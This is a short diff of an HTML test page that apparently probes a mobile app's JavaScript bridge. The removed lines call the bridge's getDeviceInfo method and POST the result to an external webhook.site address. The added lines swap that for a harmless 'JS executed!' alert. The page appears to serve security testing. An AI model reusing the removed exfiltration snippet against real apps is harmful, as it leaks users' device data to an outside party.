@@ -1,15 +1,8 @@
 <html>
   <body>
+    <h1>Payload loaded</h1>
     <script>
-      // Example: call native method to get device info
-      setTimeout(() => {
-        ApJsBridge.getDeviceInfo(function(result) {
-          fetch("https://webhook.site/1d2957cd-791f-455a-97b7-832ae45ecba6", {
-            method: "POST",
-            body: result
-          });
-        });
-      }, 1000);
+      alert("JS executed!");
     </script>
   </body>
 </html>
